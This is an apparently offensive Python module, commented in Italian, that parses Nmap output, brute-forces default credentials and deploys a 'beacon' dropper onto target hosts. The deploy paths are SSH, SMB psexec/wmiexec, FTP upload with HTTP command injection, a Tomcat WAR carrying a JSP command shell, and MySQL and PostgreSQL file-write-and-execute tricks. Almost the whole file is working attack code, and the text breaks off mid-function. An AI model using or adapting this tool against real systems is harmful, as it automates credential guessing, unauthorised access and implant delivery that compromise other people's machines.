"""
RCE Deployer: Intelligently execute commands on target based on detected services.
Reads scan XML to determine available RCE vectors (SSH, HTTP, SMB, etc).

Pipeline credenziali (unificata per tutti i servizi):
  1. Estrai credenziali da Nmap (script output) -> test rapido -> se valide, usa quelle
  2. Se non presenti, prova default credentials -> test rapido -> se valide, usa quelle
  3. Se tutto fallisce -> chiedi manualmente all'utente -> test rapido -> se valide procedi
"""

import os
import re
import subprocess
import xml.etree.ElementTree as ET
from typing import List, Dict, Optional, Tuple
from phantom.utils.notifier import notifier
from rich.console import Console

console = Console()


# =============================================================================
# SEZIONE 1: DEFAULT CREDENTIALS DATABASE
# =============================================================================
# Credenziali comuni in ambienti CTF, laboratori e configurazioni di default.
# Organizzate per servizio con priorita: le piu probabili in testa.

DEFAULT_CREDENTIALS: Dict[str, List[Tuple[str, str]]] = {
    "ssh": [
        ("root",   "root"),
        ("root",   ""),
        ("root",   "password"),
        ("admin",  "admin"),
        ("admin",  "password"),
        ("msfadmin", "msfadmin"),
        ("user",   "user"),
        ("ubuntu", "ubuntu"),
        ("debian", "debian"),
        ("pi",     "raspberry"),
        ("kali",   "kali"),
        ("vagrant","vagrant"),
        ("docker", "docker"),
    ],
    "smb": [
        ("Administrator", "Administrator"),
        ("Administrator", "password"),
        ("Administrator", ""),
        ("admin",         "admin"),
        ("guest",         ""),
        ("user",          "user"),
        ("vagrant",       "vagrant"),
    ],
    "ftp": [
        ("anonymous", "anonymous"),
        ("ftp",       "ftp"),
        ("admin",     "admin"),
        ("root",      "root"),
        ("user",      "user"),
        ("test",      "test"),
    ],
    "http": [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "tomcat"),
        ("admin", "admin123"),
        ("root",  "root"),
        ("tomcat","tomcat"),
        ("manager","manager"),
        ("both",  "tomcat"),
    ],
    "mysql": [
        ("root", ""),
        ("root", "root"),
        ("root", "password"),
        ("admin", "admin"),
        ("test",  "test"),
        ("user",  "user"),
    ],
    "postgresql": [
        ("postgres", ""),
        ("postgres", "postgres"),
        ("admin",    "admin"),
        ("root",     "root"),
    ],
}


# =============================================================================
# SEZIONE 2: PARSING Nmap
# =============================================================================

def parse_scan_xml(target: str) -> Tuple[List[Dict], Dict, List[Dict]]:
    """
    Parse il file XML di Nmap per estrarre:
      - Porte aperte con servizio, prodotto, versione
      - Info sul sistema operativo
      - Credenziali trovate dagli script Nmap (es. mysql-enum, smb-enum-users, ecc.)

    Returns:
        (ports, os_info, found_creds)
        found_creds e una lista di dict con chiavi:
          {"username": str, "password": str, "method": str, "service": str}
    """
    xml_path = f"data/sessions/scan_{target}.xml"
    ports: List[Dict] = []
    os_info: Dict = {}
    found_creds: List[Dict] = []

    if not os.path.exists(xml_path):
        return ports, os_info, found_creds

    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()

        for host in root.findall("host"):
            # --- OS detection ---
            os_elem = host.find("os")
            if os_elem is not None:
                best_match = None
                best_accuracy = 0
                for osmatch in os_elem.findall("osmatch"):
                    accuracy = int(osmatch.get("accuracy", "0"))
                    if accuracy > best_accuracy:
                        best_accuracy = accuracy
                        best_match = osmatch.get("name", "")
                if best_match and best_accuracy >= 85:
                    os_info["name"] = best_match
                    os_info["accuracy"] = best_accuracy

            # --- Port scanning ---
            ports_elem = host.find("ports")
            if ports_elem is not None:
                for port_elem in ports_elem.findall("port"):
                    port_num = int(port_elem.get("portid"))
                    protocol = port_elem.get("protocol", "tcp")
                    state_elem = port_elem.find("state")
                    state = state_elem.get("state", "closed") if state_elem is not None else "closed"

                    if state == "open":
                        service_elem = port_elem.find("service")
                        service_name = service_elem.get("name", "") if service_elem is not None else ""
                        product = service_elem.get("product", "") if service_elem is not None else ""
                        version = service_elem.get("version", "") if service_elem is not None else ""

                        port_info: Dict = {
                            "port": port_num,
                            "protocol": protocol,
                            "service": service_name,
                            "state": state,
                            "product": product,
                            "version": version,
                            "creds": [],
                        }

                        # Estrai credenziali dagli script Nmap associati alla porta
                        for script in port_elem.findall("script"):
                            script_id = script.get("id", "")
                            output = script.get("output", "")
                            extracted = _extract_credentials_from_output(script_id, output, service_name)
                            port_info["creds"].extend(extracted)
                            found_creds.extend(extracted)

                        ports.append(port_info)
    except Exception as e:
        notifier.error(f"Failed to parse scan XML: {e}")

    return ports, os_info, found_creds


def parse_scan_results(scan_results: dict) -> Tuple[List[Dict], Dict, List[Dict]]:
    """
    Fallback: parse raw text output from session['scan'] if XML is missing.
    """
    ports: List[Dict] = []
    os_info: Dict = {}
    found_creds: List[Dict] = []

    for cmd, output in scan_results.items():
        # Port regex: 22/tcp  open  ssh  OpenSSH 4.7p1
        # Supports: 22/tcp open  ssh
        # Supports: 22/tcp open  ssh  OpenSSH 4.7p1
        port_matches = re.findall(r"(\d+)/(tcp|udp)\s+open\s+([\w\-\.]+)\s*(.*)", output)
        for pnum, proto, svc, ver in port_matches:
            p_int = int(pnum)
            # Avoid duplicates if multiple commands return the same port
            if not any(p['port'] == p_int for p in ports):
                ports.append({
                    "port": p_int,
                    "protocol": proto,
                    "service": svc,
                    "state": "open",
                    "product": "", 
                    "version": ver.strip(),
                    "creds": [],
                })
        
        # OS Detection fallback from text
        if "os details:" in output.lower():
            match = re.search(r"OS details: (.*)", output, re.IGNORECASE)
            if match:
                os_info["name"] = match.group(1).strip()
                os_info["accuracy"] = 90

        # Credential extraction from script output in text
        # Nmap script output usually looks like:
        # |_ script-name: output
        # |  script-name:
        # |_   output line
        script_blocks = re.findall(r"\|\s*([\w\-\.]+):\s*\n?((?:\|.*\n?)+)", output)
        for script_id, script_out in script_blocks:
            clean_out = script_out.replace("|", "").strip()
            # We don't know the service for sure here, but we can guess from recent ports or just pass empty
            extracted = _extract_credentials_from_output(script_id, clean_out, "")
            found_creds.extend(extracted)

    return ports, os_info, found_creds


def _extract_credentials_from_output(script_id: str, output: str, service: str) -> List[Dict]:
    """
    Analizza l'output degli script Nmap per estrarre credenziali.
    Supporta script come: mysql-enum, smb-enum-users, ftp-anon, ecc.
    """
    creds: List[Dict] = []
    output_lower = output.lower()

    # Pattern: "Username: xxx" o "Password: yyy"
    user_pattern = r'(?:username|user|account)\s*[:\-=]\s*([^\s,;]+)'
    pass_pattern = r'(?:password|pass)\s*[:\-=]\s*([^\s,;]+)'

    users = re.findall(user_pattern, output, re.IGNORECASE)
    passwords = re.findall(pass_pattern, output, re.IGNORECASE)

    # Se troviamo coppie allineate, le abbiniamo
    for i, u in enumerate(users):
        p = passwords[i] if i < len(passwords) else ""
        if u and p:
            creds.append({"username": u, "password": p, "method": f"nmap_{script_id}", "service": service})

    # Pattern specifici per script Nmap noti
    if "valid credentials" in output_lower or "found" in output_lower:
        # Prova a estrarre con pattern piu generici
        for match in re.finditer(r'([\w\-\.]+)\s*[/:]\s*([\S]+)', output):
            u, p = match.groups()
            if u and p and len(p) < 50:  # Evita falsi positivi troppo lunghi
                creds.append({"username": u.strip(), "password": p.strip(), "method": f"nmap_{script_id}", "service": service})

    return creds


def detect_rce_vectors(ports: List[Dict]) -> List[Dict]:
    """
    Analizza le porte aperte e restituisce una lista di possibili vettori RCE,
    ordinati per priorita (dal piu promettente al meno).
    """
    vectors: List[Dict] = []
    port_map = {p["port"]: p for p in ports}

    # SSH (massima priorita se si hanno credenziali)
    if 22 in port_map:
        vectors.append({
            "method": "ssh",
            "port": 22,
            "priority": 10,
            "description": "SSH - Execute via shell (needs credentials)",
        })

    # SMB
    smb_port = 445 if 445 in port_map else (139 if 139 in port_map else None)
    if smb_port:
        vectors.append({
            "method": "smb_rce",
            "port": smb_port,
            "priority": 8,
            "description": f"SMB RCE via psexec/wmiexec (port {smb_port})",
        })

    # Tomcat (manager su porte HTTP comuni)
    for port in [8080, 8000, 8888, 80, 443]:
        if port in port_map:
            product = port_map[port].get("product", "").lower()
            if "tomcat" in product or "apache-tomcat" in product:
                vectors.append({
                    "method": "http_tomcat_rce",
                    "port": port,
                    "priority": 7,
                    "description": f"HTTP Tomcat RCE via WAR deploy (port {port})",
                })

    # FTP
    if 21 in port_map:
        vectors.append({
            "method": "ftp_upload_rce",
            "port": 21,
            "priority": 6,
            "description": "FTP upload + web RCE (needs creds + web access)",
        })

    # MySQL
    if 3306 in port_map:
        vectors.append({
            "method": "mysql_udf_rce",
            "port": 3306,
            "priority": 5,
            "description": "MySQL UDF RCE (needs credentials)",
        })

    # HTTP generico (command injection)
    for port in [80, 443, 8080, 8000]:
        if port in port_map and port not in [v["port"] for v in vectors]:
            vectors.append({
                "method": "http_cmd_injection",
                "port": port,
                "priority": 3,
                "description": f"HTTP command injection (port {port})",
            })

    # PostgreSQL
    if 5432 in port_map:
        vectors.append({
            "method": "postgresql_rce",
            "port": 5432,
            "priority": 4,
            "description": "PostgreSQL RCE via cmd_exec (needs credentials)",
        })

    vectors.sort(key=lambda x: x["priority"], reverse=True)
    return vectors


# =============================================================================
# SEZIONE 3: CREDENTIAL VERIFIERS (test rapidi e innocui)
# =============================================================================
# Ogni funzione prova ad autenticarsi con user/password sul servizio specifico.
# Non esegue comandi reali, solo autenticazione.
# Restituisce True se le credenziali sono valide.

def _verify_ssh(target: str, port: int, username: str, password: str) -> Optional[bool]:
    """Verifica credenziali SSH via sshpass + echo OK. Restituisce None se il tool manca."""
    import shutil
    if not shutil.which("sshpass"):
        return None
    try:
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=yes",
            # Legacy algorithms for older targets like Metasploitable2
            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
            "-o", "HostKeyAlgorithms=+ssh-rsa",
            f"{username}@{target}", "-p", str(port),
            "echo OK",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        return result.returncode == 0 and "OK" in result.stdout
    except (subprocess.TimeoutExpired, OSError):
        return False


def _verify_smb(target: str, port: int, username: str, password: str) -> bool:
    """Verifica credenziali SMB via smbclient su IPC$."""
    if not _check_tool("smbclient"):
        return False
    try:
        cmd = [
            "smbclient", f"-U", f"{username}%{password}",
            f"\\\\{target}\\IPC$", "-c", "quit",
            "-t", "5",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
        return result.returncode == 0
    except (subprocess.TimeoutExpired, OSError):
        return False


def _verify_ftp(target: str, port: int, username: str, password: str) -> bool:
    """Verifica credenziali FTP via ftplib (solo login, nessuna operazione)."""
    try:
        from ftplib import FTP, error_perm
        ftp = FTP(timeout=5)
        ftp.connect(target, port)
        ftp.login(username, password)
        ftp.quit()
        return True
    except (error_perm, OSError, EOFError):
        return False


def _verify_tomcat(target: str, port: int, username: str, password: str) -> bool:
    """Verifica credenziali Tomcat via HTTP GET su /manager/text/list."""
    try:
        import requests
        url = f"http://{target}:{port}/manager/text/list"
        resp = requests.get(url, auth=(username, password), timeout=5, verify=False)
        return resp.status_code == 200
    except ImportError:
        # Fallback: curl
        try:
            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-u", f"{username}:{password}",
                f"http://{target}:{port}/manager/text/list",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return "200" in result.stdout
        except (subprocess.TimeoutExpired, OSError):
            return False
    except Exception:
        return False


def _verify_mysql(target: str, port: int, username: str, password: str) -> bool:
    """Verifica credenziali MySQL (solo connessione, nessuna query)."""
    try:
        import mysql.connector
        conn = mysql.connector.connect(
            host=target,
            port=port,
            user=username,
            password=password,
            connection_timeout=5,
        )
        conn.close()
        return True
    except ImportError:
        # Fallback: mysql client
        try:
            cmd = [
                "mysql", f"-h{target}", f"-P{port}",
                f"-u{username}", f"-p{password}",
                "-e", "SELECT 1", "--connect-timeout=5",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, OSError):
            return False
    except Exception:
        return False


def _verify_postgresql(target: str, port: int, username: str, password: str) -> bool:
    """Verifica credenziali PostgreSQL (solo connessione)."""
    try:
        import psycopg2
        conn = psycopg2.connect(
            host=target,
            port=port,
            user=username,
            password=password,
            connect_timeout=5,
        )
        conn.close()
        return True
    except ImportError:
        return False
    except Exception:
        return False


# Mappa: method_name -> funzione di verifica
_VERIFIERS = {
    "ssh":              _verify_ssh,
    "smb_rce":          _verify_smb,
    "ftp_upload_rce":   _verify_ftp,
    "http_tomcat_rce":  _verify_tomcat,
    "mysql_udf_rce":    _verify_mysql,
    "postgresql_rce":   _verify_postgresql,
}

# Mappa: method_name -> chiave in DEFAULT_CREDENTIALS
_METHOD_TO_SERVICE = {
    "ssh":              "ssh",
    "smb_rce":          "smb",
    "ftp_upload_rce":   "ftp",
    "http_tomcat_rce":  "http",
    "mysql_udf_rce":    "mysql",
    "postgresql_rce":   "postgresql",
}


def _check_tool(tool: str) -> bool:
    """Verifica se un tool di sistema e installato. Se manca, propone l'installazione (solo su Linux)."""
    import shutil
    import os
    
    # Check for the tool (handling .exe on Windows)
    if shutil.which(tool) or (os.name == 'nt' and shutil.which(f"{tool}.exe")):
        return True
    
    # Propose installation only on Linux/POSIX
    if os.name == 'posix':
        from phantom.utils.build_helper import install_dependencies
        notifier.warn(f"Tool '{tool}' not found.")
        if install_dependencies([tool]):
            return shutil.which(tool) is not None
    else:
        notifier.error(f"Tool '{tool}' is missing. Please install it for your OS (Windows).")
        if tool == "sshpass":
            notifier.info("On Windows, you might need to use WSL or install a Windows port of sshpass.")
    
    return False


# =============================================================================
# SEZIONE 4: ASK CREDENTIALS — PIPELINE UNIFICATA
# =============================================================================

def ask_credentials(
    method: str,
    target: str,
    port: int,
    nmap_creds: Optional[List[Dict]] = None,
) -> Optional[Dict]:
    """
    Pipeline unificata per ottenere credenziali valide per un dato servizio:

        1. nmap_creds  -> test rapido -> se valide, usa quelle
        2. default     -> test rapido -> se valide, usa quelle
        3. manuale     -> test rapido -> se valide, procedi

    Returns:
        Dict con {"username": str, "password": str, "source": str}
        None se l'utente cancella o se tutto fallisce.
    """
    # Metodi che non richiedono credenziali
    if method in ("http_cmd_injection", "http_cms_rce"):
        path = input("  HTTP vulnerable path [/]: ").strip() or "/"
        return {"path": path, "source": "manual"}

    service = _METHOD_TO_SERVICE.get(method)
    if not service:
        notifier.warn(f"Unknown RCE method: {method}")
        return _ask_manual(method, target, port)

    verifier = _VERIFIERS.get(method)

    # --- STEP 1: Credenziali da Nmap ---
    if nmap_creds:
        for cred in nmap_creds:
            u = cred.get("username")
            p = cred.get("password")
            if u and p:
                console.print(f"  [cyan][*] Testing Nmap credentials: {u}:{p}[/]")
                if verifier and verifier(target, port, u, p):
                    notifier.success(f"Nmap credentials are valid: {u}:{p}")
                    return {"username": u, "password": p, "source": "nmap"}
                else:
                    console.print(f"    [red]Invalid: {u}:{p}[/]")

    # --- STEP 2: Default credentials ---
    defaults = DEFAULT_CREDENTIALS.get(service, [])
    if defaults and verifier:
        console.print(f"\n  [cyan][*] Trying {len(defaults)} default credential pairs for {service}...[/]")
        for u, p in defaults:
            console.print(f"    Trying {u}:{p}... ", end="")
            if verifier(target, port, u, p):
                console.print("[green]OK[/]")
                notifier.success(f"Default credentials found: {u}:{p}")
                return {"username": u, "password": p, "source": "default"}
            else:
                console.print("[red]Failed[/]")

    # --- STEP 3: Fallback manuale ---
    notifier.warn(f"No working credentials found for {service}.")
    console.print(f"  [yellow]Provide credentials manually for {service} on {target}:{port}[/]")

    # Chiede in loop fino a quando l'utente non fornisce credenziali valide o cancella
    for attempt in range(3):
        if service == "ftp":
            u_prompt = f"  FTP Username [anonymous]: "
            p_prompt = f"  FTP Password [anonymous]: "
            u_default, p_default = "anonymous", "anonymous"
        elif service == "mysql":
            u_prompt = f"  MySQL Username [root]: "
            p_prompt = f"  MySQL Password [blank]: "
            u_default, p_default = "root", ""
        elif service == "smb":
            u_prompt = f"  SMB Username [Administrator]: "
            p_prompt = f"  SMB Password [blank]: "
            u_default, p_default = "Administrator", ""
        elif service == "http":
            u_prompt = f"  Tomcat Username [admin]: "
            p_prompt = f"  Tomcat Password [admin]: "
            u_default, p_default = "admin", "admin"
        elif service == "postgresql":
            u_prompt = f"  PostgreSQL Username [postgres]: "
            p_prompt = f"  PostgreSQL Password [blank]: "
            u_default, p_default = "postgres", ""
        else:
            u_prompt = f"  SSH Username [msfadmin]: "
            p_prompt = f"  SSH Password [msfadmin]: "
            u_default, p_default = "msfadmin", "msfadmin"

        username = input(u_prompt).strip() or u_default
        password = input(p_prompt).strip() or p_default

        if verifier:
            console.print(f"  [cyan][*] Testing credentials...[/]")
            res = verifier(target, port, username, password)
            if res is True:
                notifier.success(f"Credentials verified: {username}:{password}")
                return {"username": username, "password": password, "source": "manual"}
            elif res is None:
                notifier.warn(f"Cannot verify credentials because a required tool (like sshpass) is missing.")
                if input("  Proceed with these credentials anyway? [y/N]: ").strip().lower() == 'y':
                    return {"username": username, "password": password, "source": "manual"}
            else:
                notifier.warn(f"Credentials invalid. {2 - attempt} attempts remaining.")
        else:
            # Nessun verifier disponibile, procede fiducioso
            return {"username": username, "password": password, "source": "manual"}

    notifier.error("Too many failed attempts.")
    return None


def _ask_manual(method: str, target: str, port: int) -> Optional[Dict]:
    """Richiesta manuale semplice per metodi senza verifier."""
    console.print(f"  [yellow]Enter credentials for {method} on {target}:{port}[/]")
    username = input("  Username: ").strip()
    password = input("  Password: ").strip()
    if username:
        return {"username": username, "password": password, "source": "manual"}
    return None


# =============================================================================
# SEZIONE 5: BRUTE FORCE CREDENTIALS (funzione wrapper per compatibilita)
# =============================================================================

def brute_force_ssh(
    target: str, port: int, creds_list: List[Tuple[str, str]]
) -> Optional[Tuple[str, str]]:
    """
    Prova una lista di credenziali SSH usando _verify_ssh.
    Restituisce (username, password) alla prima coppia valida, None altrimenti.
    """
    for username, password in creds_list:
        if _verify_ssh(target, port, username, password) is True:
            return (username, password)
    return None


def brute_force_credentials(
    method: str, target: str, port: int, creds_list: List[Tuple[str, str]]
) -> Optional[Tuple[str, str]]:
    """
    Wrapper generico: prova una lista di credenziali sul servizio specificato.
    Restituisce (username, password) se trova una coppia valida, None altrimenti.
    """
    verifier = _VERIFIERS.get(method)
    if not verifier:
        return None
    for username, password in creds_list:
        if verifier(target, port, username, password) is True:
            return (username, password)
    return None


# =============================================================================
# SEZIONE 6: DEPLOYERS (SSH, SMB, FTP, Tomcat, MySQL, PostgreSQL, HTTP)
# =============================================================================

def deploy_beacon_via_ssh(
    target: str, port: int, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """Esegue il dropper via SSH utilizzando sshpass."""
    console.print(f"\n  [*] Deploying beacon via SSH to {target}:{port}")
    console.print(f"      Username: {username}")

    manual_cmd = f"ssh {username}@{target} -p {port} '{dropper}'"

    try:
        if not _check_tool("sshpass"):
            notifier.info(f"To deploy manually, run:\n    [yellow]{manual_cmd}[/]")
            return False, "sshpass not available"

        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5",
            # Legacy algorithms for older targets like Metasploitable2
            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
            "-o", "HostKeyAlgorithms=+ssh-rsa",
            f"{username}@{target}", "-p", str(port),
            dropper,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode == 0:
            notifier.success(f"Beacon deployed via SSH to {target}")
            return True, result.stdout
        else:
            notifier.info(f"Automated deploy failed. Try manual command:\n    [yellow]{manual_cmd}[/]")
            return False, result.stderr
    except subprocess.TimeoutExpired:
        return False, "SSH connection timeout"
    except Exception as e:
        return False, str(e)


def deploy_beacon_via_smb(
    target: str, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """Esegue il dropper via SMB usando impacket psexec/wmiexec."""
    console.print(f"\n  [*] Deploying beacon via SMB to {target}")
    console.print(f"      Username: {username}")

    # Prova psexec prima, poi wmiexec come fallback
    for tool in ["psexec", "wmiexec"]:
        try:
            # Try impacket-psexec (common in Kali) or python3 -m impacket.psexec
            if shutil.which(f"impacket-{tool}"):
                cmd = [f"impacket-{tool}", f"{username}:{password}@{target}", dropper]
            else:
                cmd = ["python3", "-m", f"impacket.{tool}", f"{username}:{password}@{target}", dropper]
                
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            if result.returncode == 0:
                notifier.success(f"Beacon deployed via SMB {tool} to {target}")
                return True, result.stdout
            else:
                # If specific tool fails, log it but continue to next
                notifier.warn(f"SMB {tool} failed: {result.stderr[:100]}")
        except (subprocess.TimeoutExpired, OSError) as e:
            notifier.warn(f"SMB {tool} error: {str(e)}")
            continue

    return False, "SMB deployment failed (psexec and wmiexec both failed). Check credentials and target share access."


def deploy_beacon_via_ftp(
    target: str, port: int, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """
    Deploy beacon via FTP upload + web shell execution.
    Carica lo script in una directory web accessibile e lo esegue via HTTP.
    """
    console.print(f"\n  [*] Deploying beacon via FTP to {target}:{port}")
    console.print(f"      Username: {username}")

    try:
        from ftplib import FTP

        ftp = FTP(timeout=10)
        ftp.connect(target, port)
        ftp.login(username, password)

        # Prova directory web comuni
        web_dirs = [
            "/var/www/html", "/var/www", "/var/www/html/upload",
            "/home/www-data", "/opt/web", "/srv/http",
            "/var/www/html/uploads", "/upload", "/files",
        ]
        uploaded_dir = "/"
        for web_dir in web_dirs:
            try:
                ftp.cwd(web_dir)
                uploaded_dir = web_dir
                console.print(f"      Found web directory: {web_dir}")
                break
            except Exception:
                continue

        # Crea il dropper come script shell
        beacon_name = ".beacon.sh"
        with open("/tmp/_phantom_beacon_dropper", "w") as f:
            f.write(dropper)

        with open("/tmp/_phantom_beacon_dropper", "rb") as f:
            ftp.storbinary(f"STOR {beacon_name}", f)

        ftp.quit()

        # Esegui via HTTP
        console.print(f"  [*] Executing beacon via HTTP...")
        http_port = 80
        success, output = execute_http_rce(
            target, http_port,
            f"chmod +x /{uploaded_dir.strip('/')}/{beacon_name} && /{uploaded_dir.strip('/')}/{beacon_name}",
            "/",
        )

        if success:
            notifier.success(f"Beacon deployed via FTP+HTTP to {target}")
            return True, "FTP upload + HTTP execution successful"
        else:
            return False, "FTP upload succeeded but HTTP execution failed"

    except Exception as e:
        return False, f"FTP deployment failed: {e}"


def deploy_beacon_via_tomcat(
    target: str, port: int, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """
    Deploy beacon via Tomcat WAR upload con JSP shell.
    Richiede credenziali di manager.
    """
    console.print(f"\n  [*] Deploying beacon via Tomcat to {target}:{port}")
    console.print(f"      Username: {username}")

    try:
        import requests
        import zipfile
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            # Crea una JSP che esegue il dropper
            jsp_content = f"""<%
Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper.replace('"', '\\\\"')}"}});
%>"""

            jsp_path = f"{tmpdir}/exec.jsp"
            with open(jsp_path, "w") as f:
                f.write(jsp_content)

            # Crea WAR
            war_path = f"{tmpdir}/beacon.war"
            with zipfile.ZipFile(war_path, "w") as war:
                war.write(jsp_path, "exec.jsp")

            # Upload via Tomcat manager
            deploy_url = f"http://{target}:{port}/manager/text/deploy"
            with open(war_path, "rb") as war_file:
                resp = requests.post(
                    deploy_url,
                    auth=(username, password),
                    files={"file": war_file},
                    params={"path": "/beacon"},
                    timeout=10,
                    verify=False,
                )

            if resp.status_code in (200, 201):
                notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
                return True, resp.text
            else:
                return False, f"Tomcat upload failed: {resp.text}"

    except Exception as e:
        return False, str(e)


def deploy_beacon_via_mysql(
    target: str, port: int, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """
    Deploy beacon via MySQL.
    Tenta:
      1. INTO OUTFILE + sys_exec
      2. sys_exec diretto
    """
    console.print(f"\n  [*] Deploying beacon via MySQL to {target}:{port}")
    console.print(f"      Username: {username}")

    try:
        import mysql.connector
        conn = mysql.connector.connect(
            host=target,
            port=port,
            user=username,
            password=password,
            connection_timeout=10,
        )
        cursor = conn.cursor()

        # Tentativo 1: INTO OUTFILE
        cmd_escaped = dropper.replace('"', '\\"')
        try:
            cursor.execute(f'SELECT "{cmd_escaped}" INTO OUTFILE "/tmp/beacon.sh"')
            cursor.execute('SELECT sys_exec("chmod +x /tmp/beacon.sh")')
            cursor.execute('SELECT sys_exec("/tmp/beacon.sh")')
            conn.commit()
            cursor.close()
            conn.close()
            notifier.success(f"Beacon deployed via MySQL (OUTFILE) to {target}")
            return True, "MySQL OUTFILE execution successful"
        except Exception:
            pass

        # Tentativo 2: sys_exec diretto
        try:
            cursor.execute(f'SELECT sys_exec("{cmd_escaped}")')
            conn.commit()
            cursor.close()
            conn.close()
            notifier.success(f"Beacon deployed via MySQL (sys_exec) to {target}")
            return True, "MySQL sys_exec execution successful"
        except Exception:
            cursor.close()
            conn.close()
            return False, "MySQL UDF not available or no FILE privilege"

    except ImportError:
        return False, "mysql-connector-python not installed"
    except Exception as e:
        return False, str(e)


def deploy_beacon_via_postgresql(
    target: str, port: int, username: str, password: str, dropper: str
) -> Tuple[bool, str]:
    """
    Deploy beacon via PostgreSQL.
    Tenta di usare COPY per scrivere un file e poi eseguirlo con pg_cmd_exec.
    """
    console.print(f"\n  [*] Deploying beacon via PostgreSQL to {target}:{port}")
    console.print(f"      Username: {username}")

    try:
        import psycopg2
        conn = psycopg2.connect(
            host=target,
            port=port,
            user=username,
            password=password,
            connect_timeout=10,
        )
        cursor = conn.cursor()

        # Prova a scrivere il dropper su file system
        try:
            cursor.execute(f"COPY (SELECT '{dropper.replace(chr(39), chr(39)+chr(39))}') TO '/tmp/beacon.sh'")
            conn.commit()
            cursor.execute("SELECT pg_cmd_exec('chmod +x /tmp/beacon.sh && /tmp/beacon.sh')")
            conn.commit()
            cursor.close()
            conn.close()
            notifier.success(f"Beacon deployed via PostgreSQL to {target}")
            return True, "PostgreSQL COPY execution successful"
        except Exception:
            cursor.close()
            conn.close()
            return False, "PostgreSQL RCE not possible (no superuser or pg_cmd_exec not available)"

    except ImportError:
        return False, "psycopg2 not installed"
    except Exception as e:
        return False, str(e)


def execute_http_rce(
    target: str, port: int, command: str, path: str = "/"
) -> Tuple[bool, str]:
    """
    Esegue un comando via HTTP command injection su endpoint vulnerabili comuni.
    Usa un token di verifica per confermare l'esecuzione reale.
    """
    import random
    import string
    try:
        import requests
    except ImportError:
        return False, "requests library not available"

    token = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    verify_cmd = f"echo {token}"
    
    params_to_try = ["cmd", "command", "exec", "q", "c", "run", "execute", "shell", "x"]
    
    notifier.status(f"Scanning for injectable parameters on {target}:{port}...")
    
    for param in params_to_try:
        try:
            url = f"http://{target}:{port}{path}"
            # Test verification command
            resp = requests.get(url, params={param: verify_cmd}, timeout=5, verify=False)
            if resp.status_code == 200 and token in resp.text:
                notifier.info(f"Vulnerable parameter found: '{param}' (GET)")
                # Execute real command
                requests.get(url, params={param: command}, timeout=5, verify=False)
                return True, f"Executed via GET parameter: {param}"
        except Exception:
            continue

    # Tentativo POST
    for param in params_to_try:
        try:
            url = f"http://{target}:{port}{path}"
            resp = requests.post(url, data={param: verify_cmd}, timeout=5, verify=False)
            if resp.status_code == 200 and token in resp.text:
                notifier.info(f"Vulnerable parameter found: '{param}' (POST)")
                requests.post(url, data={param: command}, timeout=5, verify=False)
                return True, f"Executed via POST parameter: {param}"
        except Exception:
            continue

    return False, "No injectable HTTP endpoint found or verification failed."


# =============================================================================
# SEZIONE 7: MAIN ENTRY POINT
# =============================================================================

def deploy_beacon(target: str, dropper: str) -> bool:
    """
    Flusso principale di deploy beacon:

    1. Parsing scan XML (porte, OS, credenziali da Nmap)
    2. Rilevamento vettori RCE disponibili
    3. Selezione del vettore da parte dell'utente
    4. Pipeline credenziali unificata (nmap -> default -> manuale)
    5. Esecuzione del deploy con il dropper
    """
    ports, os_info, found_creds = parse_scan_xml(target)

    if not ports:
        # Fallback: try to recover from session['scan'] results (raw text)
        from phantom.core.session import session
        scan_results = session.get_result("scan")
        if scan_results:
            ports, os_info, found_creds = parse_scan_results(scan_results)

    if not ports:
        notifier.error(f"No open ports found in scan for {target}. Run 'use scan' first (and prefer the XML-saving command).")
        return False

    # Mostra porte aperte
    console.print(f"\n[cyan][*] Open ports on {target}:[/]")
    for p in ports:
        creds_str = ""
        if p.get("creds"):
            for c in p["creds"]:
                creds_str += f" [green]({c['username']}:{c['password']})[/]"
        console.print(f"    {p['port']}/{p['protocol']:<3} {p['service']:<12} {p['product']} {p['version']}{creds_str}")

    if os_info:
        console.print(f"    [dim]OS: {os_info['name']} (acc: {os_info['accuracy']}%)[/]")

    # Rileva vettori RCE
    vectors = detect_rce_vectors(ports)

    if not vectors:
        notifier.error("No RCE vectors detected from open ports.")
        return False

    # Mostra i vettori disponibili
    console.print(f"\n[cyan][*] Available RCE methods:[/]")
    for i, vec in enumerate(vectors, 1):
        console.print(f"    [bold white]{i}.[/] {vec['description']}")

    # Selezione utente
    choice = input("\n  Select RCE method [1]: ").strip() or "1"
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(vectors):
            notifier.error("Invalid selection.")
            return False
    except ValueError:
        notifier.error("Invalid selection.")
        return False

    selected = vectors[idx]
    method = selected["method"]
    port = selected["port"]

    console.print(f"\n[cyan][*] Using: {selected['description']}[/]")

    # Pipeline credenziali unificata (con credenziali trovate da Nmap)
    creds = ask_credentials(method, target, port, nmap_creds=found_creds)
    if creds is None:
        notifier.warn("Deployment cancelled.")
        return False

    # Esegui deploy in base al metodo selezionato
    deploy_map = {
